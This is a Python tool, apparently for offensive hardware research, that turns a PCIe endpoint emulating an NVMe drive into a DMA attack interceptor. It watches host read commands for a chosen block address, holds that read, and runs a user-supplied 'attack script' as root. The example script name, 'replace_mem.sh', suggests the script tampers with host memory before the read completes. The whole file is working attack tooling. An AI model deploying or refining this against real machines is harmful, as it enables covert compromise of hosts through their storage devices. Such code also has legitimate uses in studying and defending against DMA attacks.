#!/usr/bin/env python3

import struct
import os
import signal
import sys
import subprocess

DEVICE_PATH = "/dev/envme-io-cmd"

# Struct formats
nvme_rw_command_format = "<BBHIIIQQQQHHIIHH"
nvme_completion_format = "<QHHHH"

NVME_SC_SUCCESS = 0x0000
NVME_SC_INTERNAL = 0x0007

# Globals
last_command_id = None
dev = None
auto_complete_all = False
block_slba = None
attack_script = None
attack_executed = False

def parse_nvme_rw_command(data):
    fields = struct.unpack(nvme_rw_command_format, data)
    return {
        "opcode": fields[0],
        "flags": fields[1],
        "command_id": fields[2],
        "nsid": fields[3],
        "cdw2": fields[4],
        "cdw3": fields[5],
        "metadata": fields[6],
        "prp1_or_sgl1": fields[7],
        "prp2_or_sgl2": fields[8],
        "slba": fields[9],
        "length": fields[10],
        "control": fields[11],
        "dsmgmt": fields[12],
        "reftag": fields[13],
        "apptag": fields[14],
        "appmask": fields[15],
    }

def build_nvme_completion(command_id, status=NVME_SC_SUCCESS):
    result_u64 = 0
    sq_head = 0
    sq_id = 0
    return struct.pack(
        nvme_completion_format,
        result_u64,
        sq_head,
        sq_id,
        command_id,
        status
    )

def handle_sigint(sig, frame):
    global dev, last_command_id
    print("\nInterrupted!")

    if dev and last_command_id is not None:
        print(f"Sending completion for pending command_id {last_command_id} before exit...")
        try:
            cqe = build_nvme_completion(last_command_id, NVME_SC_SUCCESS)
            dev.write(cqe)
            print("CQE sent")
        except Exception as e:
            print(f"Failed to send CQE: {e}")

    try:
        with open("/sys/kernel/config/pci_ep/functions/nvmet_pci_epf/nvmepf.0/nvme/user_path_enable", "w") as f:
            f.write("0")
        print("eNVMe User-path mode disabled")
    except Exception:
        pass

    if dev:
        dev.close()
    sys.exit(0)

def execute_attack_script():
    global attack_script
    print(f"[*] Executing attack script: {attack_script}")
    try:
        subprocess.run(["sudo", "bash", attack_script], check=True)
        print("[+] Attack script executed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Attack script failed: {e}")

def main():
    global dev, last_command_id, auto_complete_all, block_slba, attack_script, attack_executed

    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <block_slba> <attack_script>")
        print("Example: sudo ./dma_nvme_interceptor.py 0x1234 /root/scripts/replace_mem.sh")
        sys.exit(1)

    try:
        block_slba = int(sys.argv[1], 0)
        attack_script = sys.argv[2]
    except ValueError:
        print("Invalid block_slba, provide as hex (0x1234) or decimal.")
        sys.exit(1)

    try:
        with open("/sys/kernel/config/pci_ep/functions/nvmet_pci_epf/nvmepf.0/nvme/user_path_enable", "w") as f:
            f.write("1")
        print("eNVMe User-path mode enabled")
    except PermissionError:
        print("Permission denied; run this script as root")
        sys.exit(1)
    except FileNotFoundError:
        print("Sysfs path not found. Is the eNVMe module loaded?")
        sys.exit(1)

    signal.signal(signal.SIGINT, handle_sigint)

    if not os.path.exists(DEVICE_PATH):
        print(f"Device {DEVICE_PATH} not found")
        sys.exit(1)

    with open(DEVICE_PATH, "r+b", buffering=0) as dev_file:
        dev = dev_file
        print(f"Waiting for commands on {DEVICE_PATH}...")

        while True:
            cmd_data = dev.read(struct.calcsize(nvme_rw_command_format))
            if not cmd_data:
                continue

            cmd = parse_nvme_rw_command(cmd_data)
            last_command_id = cmd["command_id"]

            print("Received NVMe Command:")
            for k, v in cmd.items():
                print(f"  {k}: {hex(v) if isinstance(v, int) else v}")

            # Check if SLBA matches and attack not yet executed
            if not attack_executed and cmd["slba"] == block_slba:
                print(f"[!] Matched SLBA {hex(block_slba)}. Blocking NVMe read temporarily.")
                execute_attack_script()
                attack_executed = True
                auto_complete_all = True  # From now on, auto accept all
                print("[*] Attack executed. Auto-accepting all future NVMe reads.\n")

                status = NVME_SC_SUCCESS
            else:
                status = NVME_SC_SUCCESS
                print(f"[Auto] Sending success CQE for command_id {cmd['command_id']}")

            cqe = build_nvme_completion(cmd["command_id"], status)
            dev.write(cqe)
            last_command_id = None
            print(f"Sent CQE with status: {status} for command_id {cmd['command_id']}\n")

if __name__ == "__main__":
    main()
